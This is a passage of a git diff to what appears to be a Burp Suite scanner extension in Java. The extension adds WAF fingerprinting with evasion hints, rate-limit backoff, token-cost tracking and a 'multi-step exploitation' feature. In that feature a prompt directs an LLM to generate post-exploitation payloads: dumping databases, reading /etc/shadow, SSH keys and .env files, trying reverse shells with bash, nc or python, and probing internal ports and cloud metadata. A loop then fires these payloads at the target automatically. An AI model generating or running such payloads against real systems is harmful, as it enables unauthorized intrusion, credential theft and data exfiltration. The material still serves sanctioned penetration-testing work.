                 String body = r.response.response().bodyToString();
-                sb.append("Response snippet: ").append(truncate(body, 1000)).append("\n");
+                entry.append("Response Body: ").append(stripResponseBoilerplate(body, RESPONSE_BODY_TRUNCATE)).append("\n");
             }
-            sb.append("\n");
+            entry.append("\n");
+
+            // Improvement 7: Check if adding this entry exceeds the budget
+            if (sb.length() + entry.length() > charBudget) {
+                sb.append("[... ").append(results.size() - i + 1)
+                        .append(" more results omitted — token budget reached]\n");
+                break;
+            }
+            sb.append(entry);
         }
         return sb.toString();
     }
@@ -1341,6 +1936,104 @@ public class AiVulnAnalyzer implements ScanModule {
                                boolean wafDetected, long responseTimeMs) {}
 
     private record WafBypass(String payload, String technique, String description) {}
+
+    /** WAF fingerprint collected by probing the target before fuzzing (Improvement 1). */
+    static class WafFingerprint {
+        boolean wafDetected;
+        int blockStatus;
+        String blockBodyPattern = "";
+        final List<String> blockHeaders = new ArrayList<>();
+        final List<String> passedProbes = new ArrayList<>();
+        final List<String> blockedProbes = new ArrayList<>();
+        long createdAt = System.currentTimeMillis();
+
+        String toPromptText() {
+            StringBuilder sb = new StringBuilder();
+            sb.append("WAF FINGERPRINT (pre-scan probe results):\n");
+            sb.append("  WAF Detected: ").append(wafDetected).append("\n");
+            if (wafDetected) {
+                sb.append("  Block Status: ").append(blockStatus).append("\n");
+                if (!blockBodyPattern.isEmpty())
+                    sb.append("  Block Body Pattern: ").append(blockBodyPattern).append("\n");
+                if (!blockHeaders.isEmpty())
+                    sb.append("  WAF Headers: ").append(String.join(", ", blockHeaders)).append("\n");
+            }
+            if (!passedProbes.isEmpty())
+                sb.append("  Probes that PASSED (not blocked): ").append(String.join(", ", passedProbes)).append("\n");
+            if (!blockedProbes.isEmpty())
+                sb.append("  Probes that were BLOCKED: ").append(String.join(", ", blockedProbes)).append("\n");
+            sb.append("  Strategy: Start with payload categories similar to those that passed. ")
+                    .append("Avoid patterns similar to blocked probes unless using evasion techniques.\n");
+            return sb.toString();
+        }
+    }
+
+    /** Confirmed finding stored in the scan session context (Improvement 4). */
+    private record ConfirmedFinding(String vulnType, String parameter, String url,
+                                     String payload, String evidence, long timestamp) {
+        String toPromptText() {
+            return vulnType + " on " + url + " param='" + parameter + "' via: "
+                    + (payload != null ? truncateStatic(payload, 100) : "N/A");
+        }
+    }
+
+    /** Per-host rate limit tracker (Improvement 6). */
+    static class RateLimitTracker {
+        int consecutive429s = 0;
+        int consecutiveBlockedSameHash = 0;
+        String lastBlockBodyHash = "";
+        long pauseUntil = 0;
+        int currentDelayMs = 0;
+        boolean ipBlocked = false;
+
+        synchronized void recordResponse(int statusCode, String bodyHash) {
+            if (statusCode == 429) {
+                consecutive429s++;
+            } else {
+                consecutive429s = 0;
+            }
+            // Detect IP-level blocking: same status + same body hash for 5+ consecutive
+            if (statusCode >= 400 && bodyHash != null && bodyHash.equals(lastBlockBodyHash)) {
+                consecutiveBlockedSameHash++;
+            } else {
+                consecutiveBlockedSameHash = 0;
+                lastBlockBodyHash = bodyHash != null ? bodyHash : "";
+            }
+            if (consecutiveBlockedSameHash >= 5) {
+                ipBlocked = true;
+            }
+        }
+
+        synchronized boolean shouldPause() {
+            if (ipBlocked) return true;
+            if (consecutive429s >= 3) return true;
+            return System.currentTimeMillis() < pauseUntil;
+        }
+
+        synchronized void applyBackoff(String retryAfterHeader) {
+            int delaySec = 60; // default
+            if (retryAfterHeader != null) {
+                try { delaySec = Integer.parseInt(retryAfterHeader.trim()); } catch (NumberFormatException ignored) {}
+            }
+            if (consecutive429s >= 5) {
+                currentDelayMs = Math.max(currentDelayMs * 2, delaySec * 1000);
+            } else {
+                currentDelayMs = delaySec * 1000;
+            }
+            pauseUntil = System.currentTimeMillis() + currentDelayMs;
+        }
+
+        synchronized void reset() {
+            consecutive429s = 0;
+            consecutiveBlockedSameHash = 0;
+            ipBlocked = false;
+            pauseUntil = 0;
+            currentDelayMs = 0;
+        }
+    }
+
+    /** Token usage from a single API call (Improvement 10). */
+    private record TokenUsage(long inputTokens, long outputTokens) {}
 
     // ==================== Filtering helpers ====================
 
@@ -1447,6 +2140,30 @@ public class AiVulnAnalyzer implements ScanModule {
     private static String truncate(String s, int max) {
         if (s == null) return "";
         return s.length() > max ? s.substring(0, max) + "..." : s;
+    }
+
+    private static String truncateStatic(String s, int max) {
+        if (s == null) return "";
+        return s.length() > max ? s.substring(0, max) + "..." : s;
+    }
+
+    /** Extracts the host portion from a URL. */
+    private static String extractHost(String url) {
+        if (url == null) return "";
+        try {
+            java.net.URI uri = java.net.URI.create(url);
+            return uri.getHost() != null ? uri.getHost() : url;
+        } catch (Exception e) {
+            // Fallback: try simple extraction
+            int start = url.indexOf("://");
+            if (start >= 0) start += 3; else start = 0;
+            int end = url.indexOf('/', start);
+            if (end < 0) end = url.indexOf('?', start);
+            if (end < 0) end = url.length();
+            String hostPort = url.substring(start, end);
+            int colonIdx = hostPort.indexOf(':');
+            return colonIdx > 0 ? hostPort.substring(0, colonIdx) : hostPort;
+        }
     }
 
     // ==================== Public accessors ====================
@@ -2031,6 +2748,204 @@ public class AiVulnAnalyzer implements ScanModule {
     /** Immutable snapshot of a batch file for cross-file analysis. */
     private record CapturedBatchFile(String url, String contentType, String body,
                                       HttpRequestResponse reqResp) {}
+
+    // ==================== Multi-Step Exploitation (Improvement 11) ====================
+
+    private static final String EXPLOIT_PROMPT = """
+            You are an expert penetration tester performing post-exploitation.
+            A vulnerability has been CONFIRMED on the target. Your job is to exploit it further.
+
+            Confirmed vulnerability:
+              Type: %s
+              URL: %s
+              Parameter: %s
+              Working payload: %s
+              Evidence: %s
+
+            Based on the vulnerability type, generate exploitation payloads:
+            - SQLi: dump table names (information_schema.tables), extract columns, read data, test stacked queries, test file read (LOAD_FILE), test file write (INTO OUTFILE)
+            - Command Injection: enumerate users (whoami, id), read /etc/passwd, /etc/shadow, list processes, test reverse shell payloads (bash -i, nc, python)
+            - SSTI: escalate from math eval to code execution, read files via template, test sandbox escape
+            - Path Traversal: read high-value files (SSH keys, DB configs, application source, /etc/shadow, web.config, .env)
+            - SSRF: scan internal ports (127.0.0.1:22, :3306, :5432, :6379, :8080), read cloud metadata
+
+            %s
+
+            Generate payloads for the NEXT exploitation step. If previous results are provided, build on them.
+            When you believe exploitation is complete or no further progress is possible, return empty payloads.
+
+            Respond ONLY with valid JSON:
+            {"payloads": [{"parameter": "param_name", "injection_point": "query|body|header|cookie", "payload": "the_exploitation_payload", "attack_type": "%s", "description": "what this payload extracts/does"}]}
+            """;
+
+    /**
+     * Multi-step exploitation of a confirmed finding.
+     * Called from the context menu on a confirmed finding in the findings table.
+     * Runs multiple rounds of exploitation payloads with AI-guided chaining.
+     */
+    public void exploitFinding(Finding finding, HttpRequestResponse reqResp) {
+        if (finding == null || reqResp == null) return;
+        cancelled = false;
+
+        try {
+            fuzzExecutor.submit(() -> {
+                activeScansRunning.incrementAndGet();
+                try {
+                    doExploitFinding(finding, reqResp);
+                } finally {
+                    activeScansRunning.decrementAndGet();
+                }
+            });
+        } catch (RejectedExecutionException e) {
+            logError("Exploit: Queue full, rejected for " + finding.getUrl());
+        }
+    }
+
+    private void doExploitFinding(Finding finding, HttpRequestResponse reqResp) {
+        logInfo("Exploit: Starting multi-step exploitation of " + finding.getTitle()
+                + " on " + finding.getUrl());
+
+        String vulnType = finding.getTitle();
+        String url = finding.getUrl();
+        String parameter = finding.getParameter() != null ? finding.getParameter() : "";
+        String payload = finding.getPayload() != null ? finding.getPayload() : "";
+        String evidence = finding.getEvidence() != null ? truncate(finding.getEvidence(), 500) : "";
+        String attackType = guessAttackType(vulnType);
+
+        List<FuzzResult> allResults = new ArrayList<>();
+        String previousResultsSummary = "";
+
+        for (int round = 1; round <= MAX_EXPLOIT_ROUNDS && !cancelled; round++) {
+            if (!waitForRateLimit(url)) break;
+
+            try {
+                String prevSection = previousResultsSummary.isEmpty() ? ""
+                        : "Previous exploitation results:\n" + previousResultsSummary;
+                String prompt = String.format(EXPLOIT_PROMPT,
+                        vulnType, url, parameter, truncate(payload, 300), evidence,
+                        prevSection, attackType);
+
+                logInfo("Exploit: Round " + round + " — requesting exploitation payloads");
+                String rawResponse = callWithRetry(prompt);
+                List<FuzzPayload> exploitPayloads = parseFuzzPayloads(rawResponse);
+
+                if (exploitPayloads.isEmpty()) {
+                    logInfo("Exploit: Round " + round + " — AI returned no more payloads, exploitation complete");
+                    break;
+                }
+
+                logInfo("Exploit: Round " + round + " — sending " + exploitPayloads.size() + " payloads");
+
+                for (FuzzPayload ep : exploitPayloads) {
+                    if (cancelled) break;
+                    if (!waitForRateLimit(url)) break;
+
+                    try {
+                        AtomicReference<HttpRequestResponse> ref = new AtomicReference<>();
+                        FuzzPayload resolved = resolveCollaboratorPlaceholders(ep, url, ref, null);
+                        HttpRequest modified = injectPayload(reqResp.request(), resolved);
+                        long start = System.currentTimeMillis();
+                        HttpRequestResponse response = api.http().sendRequest(modified);
+                        long elapsed = System.currentTimeMillis() - start;
+                        ref.set(response);
+                        fuzzRequestsSent.incrementAndGet();
+                        trackRateLimit(url, response);
+
+                        FuzzResult result = new FuzzResult(resolved, response, isWafBlocked(response), elapsed);
+                        allResults.add(result);
+
+                        // Report any interesting extraction as a finding
+                        if (response.response() != null) {
+                            String body = response.response().bodyToString();
+                            if (body != null && !body.isEmpty()) {
+                                int status = response.response().statusCode();
+                                if (status == 200 && body.length() > 10) {
+                                    findingsStore.addFinding(Finding.builder("ai-vuln-analyzer",
+                                                    "Exploitation Result — " + truncate(ep.description, 60),
+                                                    Severity.HIGH, Confidence.FIRM)
+                                            .url(url)
+                                            .parameter(ep.parameter)
+                                            .payload(ep.payload)
+                                            .evidence("Exploitation payload: " + truncate(ep.payload, 200)
+                                                    + "\n\nResponse (status " + status + "):\n"
+                                                    + truncate(body, 1000))
+                                            .description("[AI Exploit] " + ep.description)
+                                            .requestResponse(response)
+                                            .build());
+                                    findingsCount.incrementAndGet();
+                                }
+                            }
+                        }
+                    } catch (Exception e) {
+                        errorCount.incrementAndGet();
+                        logError("Exploit: Payload error — " + e.getMessage());
+                    }
+                }
+
+                // Build summary for next round
+                previousResultsSummary = formatResultsForLlm(allResults);
+
+            } catch (LlmException e) {
+                errorCount.incrementAndGet();
+                logError("Exploit: LLM error in round " + round + " — " + e.getMessage());
+                break;
+            }
+        }
+
+        logInfo("Exploit: Completed — " + allResults.size() + " total requests across "
+                + Math.min(MAX_EXPLOIT_ROUNDS, allResults.size()) + " rounds");
+    }
+
+    /** Guess the attack_type string from a finding title for the exploitation prompt. */
+    private static String guessAttackType(String title) {
+        if (title == null) return "unknown";
+        String lower = title.toLowerCase();
+        if (lower.contains("sql")) return "sqli";
+        if (lower.contains("xss") || lower.contains("cross-site scripting")) return "xss";
+        if (lower.contains("ssti") || lower.contains("template")) return "ssti";
+        if (lower.contains("command") || lower.contains("cmdi") || lower.contains("rce")) return "cmdi";
+        if (lower.contains("ssrf")) return "ssrf";
+        if (lower.contains("traversal") || lower.contains("lfi")) return "path_traversal";
+        if (lower.contains("xxe")) return "xxe";
+        return "unknown";
+    }
+
+    // ==================== New Public Accessors ====================
+
+    public void setSharedDataBus(SharedDataBus bus) { this.sharedDataBus = bus; }
+
+    // Cost tracking accessors (Improvement 10)
+    public long getTotalInputTokens() { return totalInputTokens.get(); }
+    public long getTotalOutputTokens() { return totalOutputTokens.get(); }
+    public int getTotalApiCalls() { return totalApiCalls.get(); }
+    public double getEstimatedCostUsd() { return estimatedCostUsd; }
+
+    /** Returns a formatted cost summary string for display in the UI. */
+    public String getCostSummary() {
+        long inTok = totalInputTokens.get();
+        long outTok = totalOutputTokens.get();
+        int calls = totalApiCalls.get();
+        if (calls == 0) return "No API calls yet";
+        return String.format("%d calls | %,dK input / %,dK output tokens | est. $%.4f",
+                calls, inTok / 1000, outTok / 1000, estimatedCostUsd);
+    }
+
+    /** Resets cost tracking counters. */
+    public void resetCostTracking() {
+        totalInputTokens.set(0);
+        totalOutputTokens.set(0);
+        totalApiCalls.set(0);
+        estimatedCostUsd = 0.0;
+    }
+
+    /** Clears the session findings context. */
+    public void clearSessionFindings() { sessionFindings.clear(); }
+
+    /** Clears the WAF fingerprint cache. */
+    public void clearWafFingerprints() { wafFingerprints.clear(); }
+
+    /** Clears rate limit trackers. */
+    public void clearRateLimitTrackers() { rateLimitTrackers.clear(); }
 
     @Override
     public void destroy() {
